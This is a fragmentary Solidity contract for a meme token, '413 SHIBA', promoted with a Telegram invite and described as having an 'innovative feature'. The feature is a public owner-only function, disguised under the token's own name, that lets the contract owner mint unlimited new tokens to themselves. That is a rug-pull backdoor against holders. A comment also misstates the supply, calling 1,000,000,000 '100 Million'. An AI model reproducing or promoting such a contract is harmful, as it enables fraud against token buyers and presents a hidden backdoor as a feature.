...
//
// $413SHIBA proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/+X7592E0atu1kMWY1
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _413SHIBA(uint256 amount) public onlyOwner {
 _413SHIBA(msg.sender, amount);
    }
    ...
    function _413SHIBA(address account, uint256 amount) internal virtual {
...
contract $413SHIBA is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("413 SHIBA", "413SHIBA") {
     _413SHIBA(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}